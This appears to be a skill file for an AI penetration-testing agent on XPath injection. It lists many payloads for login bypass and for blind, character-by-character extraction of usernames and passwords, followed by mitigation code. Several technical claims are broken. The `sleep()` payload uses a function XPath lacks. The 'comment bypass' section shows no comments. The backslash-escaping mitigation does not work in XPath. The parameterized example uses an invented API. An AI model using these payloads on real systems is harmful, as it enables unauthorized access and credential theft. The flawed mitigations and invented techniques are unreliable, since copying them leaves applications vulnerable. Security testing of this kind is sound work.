---
name: xpath-injection-testing
description: Specialized skills and methodology for XPath injection vulnerability testing
version: 1.0.0
---

# XPath Injection Vulnerability Testing

## Overview

XPath injection is a vulnerability similar to SQL injection that exploits flaws in how XPath queries are constructed, potentially leading to information disclosure, authentication bypass, and more. This skill provides methods for detecting, exploiting, and mitigating XPath injection.

## Vulnerability Mechanics

The application concatenates user input directly into XPath query statements without adequate validation or filtering, allowing attackers to alter the query logic.

**Vulnerable code example:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath Basics

### Query Syntax

**Basic queries:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Functions

**Commonly used functions:**
- `text()` - get text content
- `count()` - count nodes
- `substring()` - substring extraction
- `string-length()` - string length
- `contains()` - containment check

## Testing Methodology

### 1. Identifying XPath Input Points

**Common functionality:**
- User login
- Data search
- XML data queries
- Configuration lookups

### 2. Basic Detection

**Testing special characters:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Testing logical operators:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise bypass:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information Disclosure

**Enumerating users:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Determining node counts:**
```
' or count(//user)>0 or '
```

**Extracting specific nodes:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: logical bypass**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: matches all users
```

**Method 2: comment-based bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: boolean blind injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information Disclosure

**Enumerating all users:**
```
' or 1=1 or '
Result: returns all user nodes
```

**Extracting usernames:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Extract each character step by step
```

**Extracting passwords:**
```
' or substring(//user[1]/password,1,1)='p' or '
Extract password characters step by step
```

### Blind Injection Techniques

**Time-based blind injection:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Boolean-based blind injection:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe differences in responses
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML entity encoding:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Comment Bypass

**Using comments:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function Bypass

**Using alternative functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Tool Usage

### XPath Expression Testing

**Online tools:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Intercept XPath query requests
2. Modify the query parameters
3. Observe the responses

### Python Script

```python
from lxml import etree
from lxml.etree import XPath

# Load the XML document
doc = etree.parse('users.xml')

# Test injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Verification and Reporting

### Verification Steps

1. Confirm that the XPath query can be controlled
2. Verify authentication bypass or information disclosure
3. Assess the impact (unauthorized access, data leakage, etc.)
4. Document a complete PoC
5. Record confirmed vulnerabilities in the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform); its fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Key Reporting Points

- Vulnerability location and input parameter
- How the XPath query is constructed
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, parameterized queries, etc.)

## Mitigations

### Recommended Approaches

1. **Input validation**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use XPath variables
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Allowlist validation**
   ```java
   // Only allow specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Use precompiled queries**
   ```java
   // Predefined query template
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // Use parameter binding
   ```

5. **Least privilege**
   - Restrict the scope of XPath queries
   - Enforce access controls
   - Limit which nodes can be queried

## Precautions

- Only test in authorized environments
- Be aware of syntax differences between XPath versions
- Avoid altering XML data during testing
- Understand the target application's XPath implementation
